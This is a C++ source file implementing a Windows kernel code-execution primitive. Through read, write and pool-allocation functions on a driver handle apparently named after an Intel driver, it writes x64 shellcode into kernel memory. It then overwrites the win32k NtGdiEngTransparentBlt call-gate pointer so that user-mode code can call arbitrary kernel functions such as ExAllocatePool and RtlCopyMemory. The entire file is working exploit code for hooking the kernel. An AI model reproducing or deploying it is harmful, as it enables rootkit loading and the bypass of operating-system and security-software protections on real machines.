#include <inc.h>

unsigned char ring0_exec::shellcode[] =
{
	/*  0*/																// <R0_CallG_RIP_GATE>:
	/*  0*/ 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,	// movabs rax,0x1122334455667788		// Magic
	/* 10*/ 0x48, 0x39, 0xC1,											// cmp    rcx,rax
	/* 13*/ 0x74, 0x0C,													// je     +12 <is_hooked_thread>		// 15 + 12 = 27
	/* 15*/ 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,	// movabs rax,0x1122334455667788		// R0_NtBlt_RIP_GATE
	/* 25*/ 0xFF, 0xE0,													// jmp    rax
	/* 27*/																// <is_hooked_thread>:
	/* 27*/ 0x55,														// push   rbp
	/* 28*/ 0x48, 0x89, 0xE5,											// mov    rbp,rsp
	/* 31*/ 0x48, 0x89, 0x4D, 0x10,										// mov    QWORD PTR [rbp+0x10],rcx
	/* 35*/ 0x48, 0x89, 0x55, 0x18,										// mov    QWORD PTR [rbp+0x18],rdx
	/* 39*/ 0x4C, 0x89, 0x45, 0x20,										// mov    QWORD PTR [rbp+0x20],r8
	/* 43*/ 0x4C, 0x89, 0x4D, 0x28,										// mov    QWORD PTR [rbp+0x28],r9
	/* 47*/ 0x48, 0x89, 0xD0,											// mov    rax,rdx
	/* 50*/ 0x4C, 0x89, 0xC1,											// mov    rcx,r8
	/* 53*/ 0x4C, 0x89, 0xCA,											// mov    rdx,r9
	/* 56*/ 0x4C, 0x8B, 0x45, 0x30,										// mov    r8,QWORD PTR [rbp+0x30]
	/* 60*/ 0x4C, 0x8B, 0x4D, 0x38,										// mov    r9,QWORD PTR [rbp+0x38]
	/* 64*/ 0xFF, 0x75, 0x40,											// push   QWORD PTR [rbp+0x40]			// push
	/* 67*/ 0xFF, 0x75, 0x48,											// push   QWORD PTR [rbp+0x48]			// push
	/* 70*/ 0x48, 0x83, 0xEC, 0x20,										// sub    rsp,0x20						// 0x20
	/* 74*/ 0xFF, 0xD0,													// call   rax							// ret
	/* 76*/ 0x48, 0x89, 0xEC,											// mov    rsp, rbp
	/* 79*/ 0x5D,														// pop    rbp
	/* 80*/ 0xC3,														// ret
	/* 81*/																// <unhookself>:
	/* 81*/ 0x48, 0x83, 0xC4, 0x38,										// add    rsp,0x38						// ret + 0x20 + push + push
	/* 85*/ 0x48, 0x89, 0xEC,											// mov    rsp,rbp
	/* 88*/ 0x5D,														// pop    rbp
	/* 89*/ 0x48, 0x8B, 0x05, 0xB1, 0xFF, 0xFF, 0xFF,					// mov    rax,QWORD PTR [rip-96+15+2]	// 96 - (15 + 2) = 79 (R0_NtBlt_RIP_GATE)
	/* 96*/ 0x48, 0xA3, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,	// movabs ds:0x1122334455667788,rax		// R0_NtBlt_RIP_GATE_PTR
	/*106*/ 0x48, 0x8D, 0x0D, 0x8F, 0xFF, 0xFF, 0xFF,					// lea    rcx,QWORD PTR [rip-113]		// R0_CallG_RIP_GATE
	/*113*/ 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,	// mov    rax,0x1122334455667788		// ExFreePool
	/*123*/ 0xFF, 0xE0,													// jmp    rax
};

ring0_exec::ring0_exec(
	const decltype(pGetModuleHandleA) get_module_handle_a,
	const decltype(pGetProcAddress) get_proc_address,
	const decltype(hDevIntel) handle,
	const decltype(GetKernelModuleAddress) get_kernel_module_address,
	const decltype(pGetKernelModuleExport) get_kernel_module_export,
	const decltype(pReadMemory) read_memory,
	const decltype(pWriteMemory) write_memory,
	const decltype(pAllocatePool) allocate_pool)
	:
	pGetModuleHandleA(get_module_handle_a),
	pGetProcAddress(get_proc_address),
	hDevIntel(handle),
	GetKernelModuleAddress(get_kernel_module_address),
	pGetKernelModuleExport(get_kernel_module_export),
	pReadMemory(read_memory),
	pWriteMemory(write_memory),
	pAllocatePool(allocate_pool)
{
	printf("[+] " __FUNCTION__"\n");
	// Find win32u.dll Modul-Base
	const auto R3_win32u = this->pGetModuleHandleA("win32u.dll");
	PRINTVAR(R3_win32u, "%p");
	// Find NtGdiEngTransparentBlt
	this->R3_syscall = reinterpret_cast<uintptr_t>(this->pGetProcAddress(R3_win32u, "NtGdiEngTransparentBlt"));
	PRINTVAR(this->R3_syscall, "%llx");
	// Find win32k.sys Modul-Base
	const auto R0_win32k = reinterpret_cast<void*>(this->GetKernelModuleAddress("win32k.sys"));
	PRINTVAR(R0_win32k, "%p");
	// Calculate NtGdiEngTransparentBlt Address
	const auto R0_NtBlt = ptr_field(offset::_PUBLIC::NtGdiEngTransparentBlt, R0_win32k);
	PRINTVAR(R0_win32k, "%p");
	// Calculate Callgate-Address-Calculation-RIP
	const auto R0_NtGdiEngTransparentBlt_RIP = adr_field(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_Rip, R0_NtBlt);
	PRINTVAR(R0_NtGdiEngTransparentBlt_RIP, "%llx");
	// Calculate Callgate RIP Offset-Pointer
	const auto R0_NtBlt_RIP_GATE_OFFSET_PTR = adr_field(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_RipGate, R0_NtBlt);
	PRINTVAR(R0_NtBlt_RIP_GATE_OFFSET_PTR, "%llx");
	// Readback Callgate RIP Offset
	this->pReadMemory(this->hDevIntel,
		R0_NtBlt_RIP_GATE_OFFSET_PTR, static_cast<void*>(&this->R0_NtBlt_RIP_GATE_OFFSET),
		min(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_RipGate.bytes, sizeof(this->R0_NtBlt_RIP_GATE_OFFSET)));
	PRINTVAR(this->R0_NtBlt_RIP_GATE_OFFSET, "%llx");
	// Calculate Callgate-Pointer Address
	this->R0_NtBlt_RIP_GATE_PTR = R0_NtGdiEngTransparentBlt_RIP + this->R0_NtBlt_RIP_GATE_OFFSET;
	PRINTVAR(this->R0_NtBlt_RIP_GATE_PTR, "%llx");
	// Readback Callgate-Pointer
	this->pReadMemory(this->hDevIntel, this->R0_NtBlt_RIP_GATE_PTR, static_cast<void*>(&this->R0_NtBlt_RIP_GATE), sizeof(this->R0_NtBlt_RIP_GATE));
	PRINTVAR(this->R0_NtBlt_RIP_GATE, "%llx");
	// Allocate Kernel-Memory
	this->R0_CallG_RIP_GATE = this->pAllocatePool(this->hDevIntel, nt::POOL_TYPE::NonPagedPool, sizeof(ring0_exec::shellcode));
	PRINTVAR(this->R0_CallG_RIP_GATE, "%llx");
	this->R0_Fnc_UnhookSelf = this->R0_CallG_RIP_GATE + ring0_exec::R0_O_unhookself;
	PRINTVAR(this->R0_Fnc_UnhookSelf, "%llx");
	// Find ntoskrnl.exe Modul-Base
	this->R0_ntoskrnl = this->GetKernelModuleAddress("ntoskrnl.exe");
	PRINTVAR(this->R0_ntoskrnl, "%llx");
	// Find ExFreePool
	this->pExFreePool = this->pGetKernelModuleExport(this->hDevIntel, this->R0_ntoskrnl, "ExFreePool");
	PRINTVAR(this->pExFreePool, "%llx");
	// Edit Shellcode
	memcpy(&ring0_exec::shellcode[R0_Callgate_Mag], &ring0_exec::magic, sizeof(ring0_exec::magic));
	memcpy(&ring0_exec::shellcode[R0_Callgate_Org], &this->R0_NtBlt_RIP_GATE, sizeof(this->R0_NtBlt_RIP_GATE));
	memcpy(&ring0_exec::shellcode[R0_Callgate_Ptr], &this->R0_NtBlt_RIP_GATE_PTR, sizeof(this->R0_NtBlt_RIP_GATE_PTR));
	memcpy(&ring0_exec::shellcode[R0_P_ExFreePool], &this->pExFreePool, sizeof(this->pExFreePool));
	// Write Shellcode to allocated Kernel-Memory
	this->pWriteMemory(this->hDevIntel, R0_CallG_RIP_GATE, ring0_exec::shellcode, sizeof(ring0_exec::shellcode));
	// Overwrite Callgate-Pointer with Shellcode-Address
	this->pWriteMemory(this->hDevIntel, this->R0_NtBlt_RIP_GATE_PTR, static_cast<void*>(&this->R0_CallG_RIP_GATE), sizeof(uint64_t));
	ring0_exec::is_hooked = true;
	// Find RtlCopyMemory
	this->pRtlCopyMemory = this->pGetKernelModuleExport(this->hDevIntel, this->R0_ntoskrnl, "RtlCopyMemory");
	PRINTVAR(this->pRtlCopyMemory, "%llx");
	// Find ExAllocatePool
	this->pExAllocatePool = this->GetKernelModuleExport(this->R0_ntoskrnl, "ExAllocatePool");
	PRINTVAR(this->pExAllocatePool, "%llx");
	// Find MmGetPhysicalAddress
	this->pMmGetPhysicalAddress = this->GetKernelModuleExport(this->R0_ntoskrnl, "MmGetPhysicalAddress");
	PRINTVAR(this->pMmGetPhysicalAddress, "%llx");
}

intptr_t ring0_exec::ring0_call(
	const intptr_t ptr,
	const int64_t rcx, const int64_t rdx,
	const int64_t  r8, const int64_t  r9,
	const int32_t  p5, const int32_t  p6) const
{
	return reinterpret_cast<intptr_t(*)(
		int64_t p0, int64_t p1, int64_t p2, int64_t p3,
		int64_t p4, int64_t p5,
		int32_t p6, int32_t p7)>
		(this->R3_syscall)(
			ring0_exec::magic,
			ptr,
			rcx, rdx, r8, r9,
			p5, p6);
}

PVOID ring0_exec::R0_RtlCopyMemory(void* Dest, const void* Src, const size_t Size) const
{
	return reinterpret_cast<PVOID>(this->ring0_call(
		this->pRtlCopyMemory,
		reinterpret_cast<int64_t>(Dest),
		reinterpret_cast<int64_t>(Src),
		Size));
}

uint64_t ring0_exec::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) const
{
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	this->R0_RtlCopyMemory(&dos_header, reinterpret_cast<PVOID>(kernel_module_base), sizeof(dos_header));
	if (dos_header.e_magic != IMAGE_DOS_SIGNATURE)
		return 0;
	
	this->R0_RtlCopyMemory(&nt_headers, reinterpret_cast<PVOID>(kernel_module_base + dos_header.e_lfanew), sizeof(nt_headers));
	if (nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = static_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	this->R0_RtlCopyMemory(export_data, reinterpret_cast<PVOID>(kernel_module_base + export_base), export_base_size);

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				// Wrong function address?
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

PVOID ring0_exec::ExAllocatePool(const unsigned long long PoolType, const SIZE_T NumberOfBytes) const
{
	return reinterpret_cast<PVOID>(this->ring0_call(
		this->pExAllocatePool,
		PoolType,
		NumberOfBytes));
}

void ring0_exec::ExFreePool(PVOID P) const
{
	this->ring0_call(
		this->pExFreePool,
		reinterpret_cast<int64_t>(P));
}

ring0_exec::~ring0_exec()
{
	printf("[-] " __FUNCTION__"\n");
	
	this->ring0_call(this->R0_Fnc_UnhookSelf);
	ring0_exec::is_hooked = false;
};